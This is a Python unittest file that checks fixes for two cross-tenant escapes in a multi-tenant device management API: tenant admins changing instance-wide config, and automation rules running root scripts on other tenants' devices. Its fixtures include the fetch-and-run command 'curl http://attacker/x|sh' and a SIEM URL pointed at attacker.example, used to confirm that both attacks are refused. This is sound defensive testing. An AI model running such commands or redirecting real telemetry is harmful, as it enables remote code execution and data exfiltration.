#!/usr/bin/env python3
"""Two cross-tenant escapes an audit of the whole project turned up.

Both are the shape this codebase keeps finding: a rule applied to one half of a
pair and not the other.

1. `handle_config_save` gated on `require_admin_auth()`, which a TENANT admin
   passes, and config.json is a single INSTANCE-WIDE store. So one POST could
   set `tenancy_enforced: false` — which makes `_tenant_gate()` return None for
   everyone and turns every isolation helper in the product into a no-op. The
   v6.4.3 pass applied exactly this restriction to the config READ path and
   never to the write path, where the consequence is far worse.

2. Automation rules carried no tenant. `_run_automation_rules` fires from
   `fire_webhook` for every event on every device and matches on
   event/severity/device_match; an empty `device_match` matches EVERY device in
   the instance, and the `run_script` action queues a script body as `exec:` on
   whatever it matched, which the agent runs as root. The autopatch sibling has
   stamped and enforced a `tenant_gate` since v6.4.0 for exactly this reason,
   with a milder payload.
"""
import importlib.util
import os
import sys
import tempfile
import unittest
from pathlib import Path

os.environ.setdefault('RP_DATA_DIR', tempfile.mkdtemp(prefix='rp-v702ten-'))
_ROOT = Path(__file__).resolve().parent.parent
_CGI = _ROOT / 'server' / 'cgi-bin'
sys.path.insert(0, str(_CGI))

_spec = importlib.util.spec_from_file_location('api_v702ten', _CGI / 'api.py')
api = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(api)


class _Base(unittest.TestCase):

    def setUp(self):
        self.d = Path(tempfile.mkdtemp(prefix='rp-ten-'))
        self._saved = {}
        for n in ('DEVICES_FILE', 'CONFIG_FILE', 'RULES_FILE', 'SCRIPTS_FILE',
                  'CMDS_FILE', 'TENANTS_FILE', 'USERS_FILE', 'AUDIT_LOG_FILE'):
            self._saved[n] = getattr(api, n)
        # The BASENAME is the storage key. Under SQLite/Postgres the backend
        # selects its table from it, so a synthesised name like
        # 'devices_file.json' is not the devices store — every heartbeat 403'd
        # on the JSON-backend-only spelling. Keep the product's own filename.
            setattr(api, n, self.d / self._saved[n].name)
        self._fns = {n: getattr(api, n) for n in
                     ('respond', 'method', 'get_json_obj', 'audit_log',
                      'get_token_from_request', 'verify_token', '_tenant_gate',
                      '_tenancy_enforced', '_caller_is_superadmin')}
        self.cap = {}

        def _respond(status, data=None):
            self.cap['status'], self.cap['data'] = status, data
            raise api.HTTPError(status, data)
        api.respond = _respond
        api.audit_log = lambda *a, **k: None
        api.get_token_from_request = lambda: 'tok'
        api._LOAD_CACHE.clear()
        api.save(api.DEVICES_FILE, {
            'a1': {'name': 'a-host', 'tenant': 'tenant-a'},
            'b1': {'name': 'b-host', 'tenant': 'tenant-b'},
        })
        api.save(api.CONFIG_FILE, {'tenancy_enforced': True})
        api._LOAD_CACHE.clear()

    def tearDown(self):
        for n, v in self._saved.items():
            setattr(api, n, v)
        for n, v in self._fns.items():
            setattr(api, n, v)
        api._LOAD_CACHE.clear()

    def _call(self, fn, *a):
        self.cap.clear()
        try:
            fn(*a)
            return 200, self.cap.get('data')
        except api.HTTPError:
            return self.cap.get('status'), self.cap.get('data')

    def _as_tenant_admin(self, tenant='tenant-b'):
        api.verify_token = lambda _t=None: ('badmin', 'admin')
        api._tenant_gate = lambda: tenant
        api._tenancy_enforced = lambda: True
        api._caller_is_superadmin = lambda: False

    def _as_superadmin(self):
        api.verify_token = lambda _t=None: ('root', 'admin')
        api._tenant_gate = lambda: None
        api._tenancy_enforced = lambda: True
        api._caller_is_superadmin = lambda: True


class TestATenantAdminCannotTurnTenancyOff(_Base):

    def test_the_write_is_refused(self):
        self._as_tenant_admin()
        api.method = lambda: 'POST'
        api.get_json_obj = lambda: {'tenancy_enforced': False}
        st, _d = self._call(api.handle_config_save)
        self.assertEqual(st, 403, 'a tenant admin disabled multi-tenancy')
        api._LOAD_CACHE.clear()
        self.assertIs((api.load(api.CONFIG_FILE) or {}).get('tenancy_enforced'), True,
                      'the instance store was modified anyway')

    def test_the_other_instance_wide_keys_are_refused_too(self):
        """One handler writes them all — trust_proxy walks past the IP
        allowlist, webhook_urls redirects the operator's alerts, siem_url blinds
        the SIEM, maintenance_mode stops every tenant's command dispatch."""
        self._as_tenant_admin()
        api.method = lambda: 'POST'
        for key, val in (('trust_proxy', True), ('maintenance_mode', True),
                         ('siem_url', 'http://attacker.example/collect'),
                         ('audit_forward_enabled', False)):
            api.get_json_obj = lambda _k=key, _v=val: {_k: _v}
            st, _d = self._call(api.handle_config_save)
            self.assertEqual(st, 403, key)

    def test_the_platform_operator_can_still_save(self):
        """Control. A guard that refused everyone would pass the assertions
        above and break the product."""
        self._as_superadmin()
        api.method = lambda: 'POST'
        api.get_json_obj = lambda: {'tenancy_enforced': True, 'trust_proxy': False}
        st, _d = self._call(api.handle_config_save)
        self.assertEqual(st, 200, self.cap.get('data'))

    def test_and_a_single_tenant_install_is_untouched(self):
        """Control. With tenancy off the branch is never taken and every admin
        keeps exactly the access it has today."""
        api.verify_token = lambda _t=None: ('alice', 'admin')
        api._tenant_gate = lambda: None
        api._tenancy_enforced = lambda: False
        api._caller_is_superadmin = lambda: False
        api.method = lambda: 'POST'
        api.get_json_obj = lambda: {'trust_proxy': True}
        st, _d = self._call(api.handle_config_save)
        self.assertEqual(st, 200, self.cap.get('data'))


class TestAnAutomationRuleCannotReachAnotherTenant(_Base):

    def _make_rule(self, tenant, device_match=None):
        self._as_tenant_admin(tenant)
        api.method = lambda: 'POST'
        api.get_json_obj = lambda: {
            'name': 'pwn', 'enabled': True,
            'match': {'events': ['device_offline'],
                      'device_match': device_match or {}},
            'actions': [{'type': 'run_script', 'script_id': 's1'}],
            'cooldown_seconds': 0}
        st, rule = self._call(api.handle_automation_rule_create)
        self.assertEqual(st, 201, rule)
        return rule

    def test_the_rule_records_the_tenant_that_made_it(self):
        rule = self._make_rule('tenant-b')
        self.assertEqual(rule['tenant_gate'], 'tenant-b',
                         'a rule with no tenant fires against every device in '
                         'the instance')

    def test_it_does_not_fire_on_another_tenants_device(self):
        self._make_rule('tenant-b')
        api.save(api.SCRIPTS_FILE, {'scripts': [
            {'id': 's1', 'name': 'x', 'body': 'curl http://attacker/x|sh'}]})
        api._LOAD_CACHE.clear()
        api._run_automation_rules('device_offline', {'device_id': 'a1'},
                                  api.load(api.CONFIG_FILE) or {})
        queued = (api.load(api.CMDS_FILE) or {}).get('a1') or []
        self.assertEqual(queued, [],
                         'tenant-b queued a root command on tenant-a\'s host')

    def test_it_still_fires_on_its_own(self):
        """Control: the gate must not break the feature it confines."""
        self._make_rule('tenant-b')
        api.save(api.SCRIPTS_FILE, {'scripts': [
            {'id': 's1', 'name': 'x', 'body': 'echo hello'}]})
        api._LOAD_CACHE.clear()
        api._run_automation_rules('device_offline', {'device_id': 'b1'},
                                  api.load(api.CONFIG_FILE) or {})
        queued = (api.load(api.CMDS_FILE) or {}).get('b1') or []
        self.assertEqual(len(queued), 1, 'the rule stopped working on its own tenant')
        self.assertIn('echo hello', queued[0])

    def test_a_pre_v702_rule_with_no_gate_is_unchanged(self):
        """Retro-assigning an existing rule to a tenant would be a guess about
        who owns it, so an ungated rule keeps its old behaviour."""
        api.save(api.RULES_FILE, {'rules': [{
            'id': 'r-old', 'enabled': True, 'name': 'legacy',
            'match': {'events': ['device_offline'], 'device_match': {}},
            'actions': [{'type': 'run_script', 'script_id': 's1'}],
            'cooldown_seconds': 0}]})
        api.save(api.SCRIPTS_FILE, {'scripts': [
            {'id': 's1', 'name': 'x', 'body': 'echo legacy'}]})
        api._LOAD_CACHE.clear()
        api._run_automation_rules('device_offline', {'device_id': 'a1'},
                                  api.load(api.CONFIG_FILE) or {})
        self.assertEqual(len((api.load(api.CMDS_FILE) or {}).get('a1') or []), 1)

    def test_another_tenant_cannot_see_edit_or_delete_it(self):
        rule = self._make_rule('tenant-b')
        self._as_tenant_admin('tenant-a')
        api.method = lambda: 'GET'
        _st, data = self._call(api.handle_automation_rules_list)
        self.assertEqual(data['rules'], [],
                         "another tenant's rule names a script id and a device "
                         "match, and it runs code as root")
        api.method = lambda: 'PUT'
        api.get_json_obj = lambda: {
            'name': 'repointed', 'match': {'events': ['device_offline']},
            'actions': [{'type': 'run_script', 'script_id': 's1'}]}
        st, _d = self._call(api.handle_automation_rule_update, rule['id'])
        self.assertEqual(st, 404)
        api.method = lambda: 'DELETE'
        st, _d = self._call(api.handle_automation_rule_delete, rule['id'])
        self.assertEqual(st, 404)

    def test_an_update_cannot_supply_its_own_gate(self):
        rule = self._make_rule('tenant-b')
        api.method = lambda: 'PUT'
        api.get_json_obj = lambda: {
            'name': 'x', 'tenant_gate': None,
            'match': {'events': ['device_offline']},
            'actions': [{'type': 'run_script', 'script_id': 's1'}]}
        self._call(api.handle_automation_rule_update, rule['id'])
        api._LOAD_CACHE.clear()
        stored = (api.load(api.RULES_FILE) or {}).get('rules')[0]
        self.assertEqual(stored['tenant_gate'], 'tenant-b',
                         'the gate was overwritten from the request body')


if __name__ == '__main__':
    unittest.main()
